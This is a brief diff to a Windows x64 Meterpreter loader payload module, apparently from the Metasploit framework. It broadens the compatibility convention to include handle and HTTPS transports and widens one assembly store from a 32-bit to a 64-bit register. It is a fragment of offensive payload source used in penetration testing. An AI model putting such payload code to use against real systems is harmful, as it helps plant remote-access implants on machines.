@@ -29,7 +29,7 @@ module Payload::Windows::MeterpreterLoader_x64
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X64,
-      'PayloadCompat' => { 'Convention' => 'sockrdi' },
+      'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
       'Stage'         => { 'Payload'   => "" }
       ))
   end
@@ -56,8 +56,8 @@ module Payload::Windows::MeterpreterLoader_x64
 
     unless opts[:stageless]
       asm << %Q^
-          ; store the comms socket handle
-          mov dword ptr [rbx], edi
+          ; store the comms socket or handle
+          mov [rbx], rdi
       ^
     end
 
